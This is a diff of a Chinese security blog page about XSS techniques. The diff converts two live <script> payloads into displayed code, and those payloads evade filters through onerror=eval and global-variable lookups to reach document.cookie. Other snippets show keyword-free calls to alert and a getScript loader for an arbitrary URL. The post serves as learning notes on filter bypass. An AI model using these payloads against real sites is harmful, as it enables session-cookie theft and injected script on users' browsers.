@@ -97,7 +97,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/06/17/5d078b1d0b5d277669.png">
 <meta property="og:image" content="https://i.loli.net/2019/06/17/5d078da09539397951.png">
 <meta property="og:image" content="https://i.loli.net/2019/06/17/5d078e1fe3a7988325.png">
-<meta property="og:updated_time" content="2019-06-17T13:25:24.206Z">
+<meta property="og:updated_time" content="2019-06-17T13:28:40.085Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS姿势学习">
 <meta name="twitter:description" content="0x00 前言前段时间看到了无需括号和分号的XSS,最近又看了利用JavaScript全局变量绕过XSS过滤器,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。 0x01 无需括号和分号的XSS早在几年前，作者就提到过在javascript中调用函数而无需括号的方法&amp;lt;script&amp;gt;onerror=alert;throw 1337&amp;lt;/script&amp;gt;">
@@ -468,13 +468,7 @@
 <p>甚至可以使用<code>self[&quot;$&quot;][&quot;getScript&quot;](url)</code>来加载任意js文件<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"getScript"</span>]("https://example.com/my.js");</span><br></pre></td></tr></table></figure></p>
 <p>另外还可以使用javascript迭代器<code>Object.keys</code>和正则表达式的方法去获取指定函数。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = function() &#123;</span><br><span class="line">    <span class="built_in">c</span>=<span class="number">0</span>; <span class="comment">// index counter</span></span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">c</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">c</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in one line</span></span><br><span class="line">a=()=&gt;&#123;<span class="built_in">c</span>=<span class="number">0</span>;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>)&#123;<span class="keyword">if</span>(/^a[rel]+t$/.test(i))&#123;<span class="keyword">return</span> <span class="built_in">c</span>&#125;<span class="built_in">c</span>++&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// then you can use a() with Object.keys</span></span><br><span class="line"><span class="comment">// alert("foo")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">self</span>[<span class="type">Object</span>.keys(<span class="keyword">self</span>)[a()]](<span class="string">"foo"</span>)</span><br></pre></td></tr></table></figure></p>
 <p>使用这些方法，可以说可以在很大程度上绕过一些检测关键字黑名单的waf了。</p>
-<p>如果与第一种方法相结合，更是可以组合出更有效的payload<br>···</p>
-<script>throw/a/,Uncaught=1,g=alert,a=URL%2b0,self[`on`%2b`error`]=eval,/1/g%2ba[12]%2b"self[`document`][`cookie`]"%2ba[13]</script>
-
-
-<script>TypeError.prototype.name="=/",0[self[`on`%2b`error`]=self["eval"]]["/-self[`alert`](self[`document`][`cookie`])//"]</script>
-
-<p>···</p>
+<p>如果与第一种方法相结合，更是可以组合出更有效的payload<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>throw/a/,Uncaught=1,g=alert,a=URL%2b0,self[<span class="string">`on`%2b`error`</span>]=eval,/1/g%2ba[<span class="string">12</span>]%2b"self[<span class="string">`document`</span>][<span class="symbol">`cookie`</span>]"%2ba[13]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name="=/",0[<span class="string">self[`on`%2b`error`</span>]=self[<span class="string">"eval"</span>]][<span class="string">"/-self[`alert`</span>](<span class="link">self[`document`][`cookie`]</span>)//"]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
 <h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://portswigger.net/blog/xss-without-parentheses-and-semi-colons" target="_blank" rel="noopener">https://portswigger.net/blog/xss-without-parentheses-and-semi-colons</a><br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>
 
       
@@ -495,7 +489,7 @@
   <p><span>本文标题:</span><a href="/XSS姿势学习/">XSS姿势学习</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
   <p><span>发布时间:</span>2019年06月17日 - 21:24</p>
-  <p><span>最后更新:</span>2019年06月17日 - 21:25</p>
+  <p><span>最后更新:</span>2019年06月17日 - 21:28</p>
   <p><span>原始链接:</span><a href="/XSS姿势学习/" title="XSS姿势学习">https://zhengbao.wang/XSS姿势学习/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/XSS姿势学习/" aria-label="复制成功！"></i></span>
   </p>
